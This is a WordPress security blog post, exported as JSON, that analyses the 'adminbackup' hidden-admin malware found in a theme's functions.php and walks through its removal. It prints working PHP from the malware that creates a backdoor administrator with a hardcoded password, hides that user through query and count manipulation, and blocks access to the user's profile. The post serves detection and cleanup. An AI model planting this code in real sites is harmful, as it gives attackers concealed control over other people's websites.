{
  "id": 1835,
  "slug": "how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis",
  "date": "2026-01-06T20:46:46",
  "modified": "2026-01-06T14:52:13",
  "title": "How to Find and Remove Hidden Admin Users in WordPress (Malware Analysis)",
  "content": "<p>Have you ever looked at your WordPress user dashboard and felt like the math didn&#8217;t quite add up? Maybe your dashboard says &#8220;All Users (1)&#8221;, but a plugin counter says &#8220;2&#8221;?</p>\n<p>This is not a database glitch. It is often the footprint of a sophisticated malware infection designed to maintain a &#8220;backdoor&#8221; into your website.</p>\n<p>In this case study, we break down a specific infection we recently encountered: the <strong><code>adminbackup</code></strong> user hack. We will analyze exactly how the malware hid the user from the interface, why the numbers didn&#8217;t match, and how we removed it.</p>\n<h2>The Symptom: When 1 + 0 = 2</h2>\n<p>The infection started with a subtle anomaly. Upon logging into the WordPress dashboard to check the user list, everything looked normal at first glance.</p>\n<ul>\n<li><strong>Visible Users:</strong> 1 (The main Administrator)</li>\n<li><strong>&#8220;All&#8221; Count:</strong> (1)</li>\n<li><strong>&#8220;Administrator&#8221; Count:</strong> (1)</li>\n</ul>\n<p>However, looking closer at the filter bar, we noticed a discrepancy caused by a Two-Factor Authentication (2FA) plugin:</p>\n<ul>\n<li>2FA Active: (0)</li>\n<li><strong>2FA Inactive: (2)</strong></li>\n</ul>\n<p><strong>The math didn&#8217;t work.</strong> If there is only <strong>1</strong> user on the site, how can <strong>2</strong> users have inactive 2FA?</p>\n<figure class=\"wp-block-image\"><img decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2026/01/Screenshot_2-1.png\" alt=\"WordPress user dashboard showing count discrepancy where All users is 1 but 2FA Inactive is 2\" /><figcaption><em>The smoking gun: The dashboard shows &#8220;All (1)&#8221; but the plugin detects &#8220;2FA Inactive (2)&#8221;.</em></figcaption></figure>\n<p>This discrepancy is the hallmark of a <strong>Hidden Administrator Hack</strong>. The malware was clever enough to lie to WordPress, but it forgot to lie to the 3rd party 2FA plugin.</p>\n<h2>The Discovery: Malicious Code in functions.php</h2>\n<p>After a file integrity scan, we located the culprit hiding inside the active theme&#8217;s <code>functions.php</code> file. This is a common hiding spot because <code>functions.php</code> is loaded on every page load, ensuring the malware always runs.</p>\n<p>The malware was creating a user named <strong><code>adminbackup</code></strong> with the email <code>adminbackup@wordpress.org</code>.</p>\n<h3>1. The Injection Mechanism</h3>\n<p>The malware first checks if the user exists. If not, it creates it silently.</p>\n<pre><code>$params = array(\r\n    'user_login' =&gt; 'adminbackup',\r\n    'user_pass' =&gt; 'o8Qcdaevd9', // Hardcoded malicious password\r\n    'role' =&gt; 'administrator',\r\n    'user_email' =&gt; 'adminbackup@wordpress.org'\r\n);\r\n\r\nif (!username_exists($params['user_login'])) {\r\n    $id = wp_insert_user($params);\r\n    update_option('_pre_user_id', $id);\r\n}\r\n</code></pre>\n<p><strong>Why this is dangerous:</strong> Even if you delete the user, as soon as someone visits the site, this code runs and recreates the admin immediately.</p>\n<h2>The Technical Deep Dive: How the User Was Hidden</h2>\n<p>The most interesting part of this malware is not <em>that</em> it created a user, but <strong>how it made that user invisible</strong> to the site owner.</p>\n<p>The malware utilized native WordPress hooks to blind the administrator. It did this in two distinct steps:</p>\n<h3>Step 1: Modifying the Database Query</h3>\n<p>WordPress uses the <code>WP_User_Query</code> class to fetch users from the database. The malware intercepted this query using the <code>pre_user_query</code> hook to filter itself out.</p>\n<pre><code>function wp_enqueue_async_script($user_search) {\r\n    $user_id = get_current_user_id();\r\n    $id = get_option('_pre_user_id'); // The ID of the malicious user\r\n\r\n    global $wpdb;\r\n    // Inject SQL to exclude the malicious ID\r\n    $user_search-&gt;query_where = str_replace('WHERE 1=1',\r\n        \"WHERE {$id}={$id} AND {$wpdb-&gt;users}.ID&lt;&gt;{$id}\",\r\n        $user_search-&gt;query_where\r\n    );\r\n}\r\n</code></pre>\n<p><strong>Translation:</strong> The code tells the database: <em>&#8220;Fetch all the users, EXCEPT the one with this specific malware ID.&#8221;</em> This is why the row for <code>adminbackup</code> never appeared in the table list.</p>\n<h3>Step 2: Faking the &#8220;Counts&#8221;</h3>\n<p>Even if the user is hidden from the list, the &#8220;All (2)&#8221; count at the top of the page would normally give it away. To cover its tracks, the malware modified the HTML of the views to mathematically subtract 1 from the total.</p>\n<pre><code>function wp_generate_dynamic_cache($views) {\r\n    // Explode the HTML string to find the count number\r\n    $html = explode('&lt;span class=\"count\"&gt;(', $views['all']);\r\n    $count = explode(')&lt;/span&gt;', $html[1]);\r\n    \r\n    // Mathematically subtract 1 from the real count\r\n    $count[0]--; \r\n    \r\n    // Rebuild the HTML string\r\n    $views['all'] = $html[0] . '&lt;span class=\"count\"&gt;(' . $count[0] . ')&lt;/span&gt;' . $count[1];\r\n    \r\n    return $views;\r\n}\r\n</code></pre>\n<h3>The Mistake: Why We Caught It</h3>\n<p>The malware developer hard-coded this logic for the standard WordPress views. They did <strong>not</strong> account for custom views added by plugins. The 2FA plugin added a column for &#8220;2FA Inactive&#8221;. The malware didn&#8217;t know to subtract 1 from that specific view.</p>\n<p><img loading=\"lazy\" decoding=\"async\" class=\" wp-image-1837 aligncenter\" src=\"https://cms.mdpabel.com/wp-content/uploads/2026/01/Screenshot_1-2-300x179.png\" alt=\"\" width=\"719\" height=\"429\" srcset=\"https://cms.mdpabel.com/wp-content/uploads/2026/01/Screenshot_1-2-300x179.png 300w, https://cms.mdpabel.com/wp-content/uploads/2026/01/Screenshot_1-2-1024x612.png 1024w, https://cms.mdpabel.com/wp-content/uploads/2026/01/Screenshot_1-2-768x459.png 768w, https://cms.mdpabel.com/wp-content/uploads/2026/01/Screenshot_1-2.png 1431w\" sizes=\"auto, (max-width: 719px) 100vw, 719px\" /></p>\n<h2>The &#8220;Protection&#8221; Mechanism</h2>\n<p>The malware also included a fail-safe. If a savvy admin guessed the ID of the hidden user and tried to navigate directly to their profile (e.g., <code>user-edit.php?user_id=123</code>), the malware blocked access:</p>\n<pre><code>if (isset($_GET['user_id']) &amp;&amp; $_GET['user_id'] == $id &amp;&amp; $user_id != $id)\r\n    wp_die(__('Invalid user ID.'));\r\n</code></pre>\n<p>It forces an &#8220;Invalid User ID&#8221; error, making the admin think the user doesn&#8217;t actually exist, discouraging further investigation.</p>\n<h2>Remediation: How to Remove the Hidden Admin</h2>\n<p>If you find yourself in this situation, you cannot simply &#8220;delete&#8221; the user via the dashboard, because the code will recreate it immediately. Follow this exact cleanup process:</p>\n<ol>\n<li><strong>Access Your Files (FTP/File Manager):</strong> Do not try to fix this from inside the WordPress dashboard. You need server access (cPanel or SFTP).</li>\n<li><strong>Locate and Clean <code>functions.php</code>:</strong> Navigate to <code>wp-content/themes/your-active-theme/functions.php</code>. Look for the malicious code blocks shown above. <strong>Delete the code entirely and save the file.</strong></li>\n<li><strong>Remove the Malicious User:</strong> Now that the &#8220;cloaking&#8221; code is gone, the user will be visible.\n<ul>\n<li>Refresh your WordPress Users page.</li>\n<li>You will now see <strong>adminbackup</strong> in the list.</li>\n<li>Hover over the user and click <strong>Delete</strong>.</li>\n</ul>\n</li>\n</ol>\n<figure class=\"wp-block-image\"><img decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2026/01/Screenshot_3-2.png\" alt=\"WordPress user list showing the previously hidden adminbackup user exposed\" /><figcaption><em>Context: After removing the code in functions.php, the user appears and can be safely deleted.</em></figcaption></figure>\n<ol start=\"4\">\n<li><strong>Update Your Salts and Passwords:</strong> Since a hacker had administrative access, you must assume all sessions are compromised.\n<ul>\n<li><strong>Update WordPress Salts:</strong> Edit your <code>wp-config.php</code> file and replace the salt keys. This forces a logout for everyone.</li>\n<li><strong>Change Passwords:</strong> Change the passwords for all legit Administrator accounts.</li>\n</ul>\n</li>\n</ol>\n<h2>Summary</h2>\n<p>This case study highlights the importance of paying attention to small details in your WordPress dashboard.</p>\n<ul>\n<li><strong>Trust the inconsistencies:</strong> If numbers don&#8217;t match, investigate.</li>\n<li><strong>Check <code>functions.php</code>:</strong> It is the most common home for this type of malware.</li>\n<li><strong>Use Activity Logs:</strong> An activity log plugin would have recorded the creation of the user <code>adminbackup</code>, even if the user list hid it.</li>\n</ul>\n<p><strong>Have you noticed a user count mismatch on your WordPress site?</strong> Don&#8217;t ignore it. It might be the only clue you have that someone else is holding the keys to your website.</p>\n",
  "excerpt": "<p>Have you ever looked at your WordPress user dashboard and felt like the math didn&#8217;t quite add up? Maybe your dashboard says &#8220;All Users (1)&#8221;, but a plugin counter says &#8220;2&#8221;? This is not a database glitch. It is often the footprint of a sophisticated malware infection designed to maintain a &#8220;backdoor&#8221; into your website. [&hellip;]</p>\n",
  "link": "https://cms.mdpabel.com/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/",
  "yoastHead": "<link rel=\"canonical\" href=\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\" />\n<!-- This site is optimized with the Yoast SEO Premium plugin v25.9 (Yoast SEO v26.8) - https://yoast.com/product/yoast-seo-premium-wordpress/ -->\n<title>How to Find and Remove Hidden Admin Users in WordPress (Malware Analysis) - MD Pabel</title>\n<meta name=\"description\" content=\"Learn how to detect and remove hidden administrator malware in WordPress. We analyze the adminbackup hack inside functions.php that causes user count discrepancies and hides backdoors\" />\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"How to Find and Remove Hidden Admin Users in WordPress (Malware Analysis)\" />\n<meta property=\"og:description\" content=\"Learn how to detect and remove hidden administrator malware in WordPress. We analyze the adminbackup hack inside functions.php that causes user count discrepancies and hides backdoors\" />\n<meta property=\"og:url\" content=\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\" />\n<meta property=\"og:site_name\" content=\"MD Pabel\" />\n<meta property=\"article:author\" content=\"https://www.mdpabel.com/author/mdpabel/\" />\n<meta property=\"article:published_time\" content=\"2026-01-06T14:46:46+00:00\" />\n<meta property=\"article:modified_time\" content=\"2026-01-06T14:52:13+00:00\" />\n<meta property=\"og:image\" content=\"https://cms.mdpabel.com/wp-content/uploads/2026/01/removed-hidden-admin-user.png?wsr\" />\n\t<meta property=\"og:image:width\" content=\"942\" />\n\t<meta property=\"og:image:height\" content=\"514\" />\n\t<meta property=\"og:image:type\" content=\"image/png\" />\n<meta name=\"author\" content=\"MD Pabel\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:label1\" content=\"Written by\" />\n\t<meta name=\"twitter:data1\" content=\"MD Pabel\" />\n\t<meta name=\"twitter:label2\" content=\"Est. reading time\" />\n\t<meta name=\"twitter:data2\" content=\"5 minutes\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"TechArticle\",\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"},\"author\":{\"name\":\"MD Pabel\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"headline\":\"How to Find and Remove Hidden Admin Users in WordPress (Malware Analysis)\",\"datePublished\":\"2026-01-06T14:46:46+00:00\",\"dateModified\":\"2026-01-06T14:52:13+00:00\",\"mainEntityOfPage\":{\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"},\"wordCount\":835,\"commentCount\":0,\"image\":{\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2026/01/removed-hidden-admin-user.png?wsr\",\"articleSection\":[\"Hacked Website\",\"Malware Type\",\"WordPress Malware\"],\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"CommentAction\",\"name\":\"Comment\",\"target\":[\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"]}]},{\"@type\":\"WebPage\",\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\",\"url\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\",\"name\":\"How to Find and Remove Hidden Admin Users in WordPress (Malware Analysis) - MD Pabel\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/#website\"},\"primaryImageOfPage\":{\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"},\"image\":{\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2026/01/removed-hidden-admin-user.png?wsr\",\"datePublished\":\"2026-01-06T14:46:46+00:00\",\"dateModified\":\"2026-01-06T14:52:13+00:00\",\"author\":{\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"description\":\"Learn how to detect and remove hidden administrator malware in WordPress. We analyze the adminbackup hack inside functions.php that causes user count discrepancies and hides backdoors\",\"breadcrumb\":{\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\"]}]},{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\",\"url\":\"https://cms.mdpabel.com/wp-content/uploads/2026/01/removed-hidden-admin-user.png?wsr\",\"contentUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2026/01/removed-hidden-admin-user.png?wsr\",\"width\":942,\"height\":514,\"caption\":\"WordPress malware security illustration showing a hidden administrator hack with a user count mismatch, titled The Ghost Admin.\"},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://www.mdpabel.com/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://www.mdpabel.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"How to Find and Remove Hidden Admin Users in WordPress (Malware Analysis)\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://www.mdpabel.com/#website\",\"url\":\"https://www.mdpabel.com/\",\"name\":\"MD Pabel\",\"description\":\"Full Stack Developer, Malware Removal &amp; Security Specialist\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://www.mdpabel.com/blog/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"},{\"@type\":\"Person\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\",\"name\":\"MD Pabel\",\"image\":{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/#/schema/person/image/\",\"url\":\"https://secure.gravatar.com/avatar/b6b48a60efe9dc8cd04d4a7e5c9b22cafd47332f65a407ce270e8ad7f8843372?s=96&d=mm&r=g\",\"contentUrl\":\"https://secure.gravatar.com/avatar/b6b48a60efe9dc8cd04d4a7e5c9b22cafd47332f65a407ce270e8ad7f8843372?s=96&d=mm&r=g\",\"caption\":\"MD Pabel\"},\"description\":\"MD Pabel is the Founder and CEO of 3Zero Digital, a leading agency specializing in custom web development, WordPress security, and malware removal. With over 7+ Years of experience, he has completed more than3200+ projects, served over 2300+ clients, and resolved4500+ cases of malware and hacked websites.\",\"sameAs\":[\"https://www.mdpabel.com/\",\"https://www.facebook.com/in/mdpabe1\",\"https://www.linkedin.com/in/mdpabe1\"],\"url\":\"https://www.mdpabel.com/author/mdpabel/\"}]}</script>\n<!-- / Yoast SEO Premium plugin. -->",
  "featuredImage": {
    "url": "https://cms.mdpabel.com/wp-content/uploads/2026/01/removed-hidden-admin-user.png",
    "alt": "WordPress malware security illustration showing a hidden administrator hack with a user count mismatch, titled The Ghost Admin."
  },
  "categories": [
    {
      "id": 25,
      "name": "Hacked Website",
      "slug": "hacked-website"
    },
    {
      "id": 64,
      "name": "Malware Type",
      "slug": "malware-type"
    },
    {
      "id": 27,
      "name": "WordPress Malware",
      "slug": "wordpress-malware"
    }
  ],
  "acf": {
    "custom_schema": ""
  }
}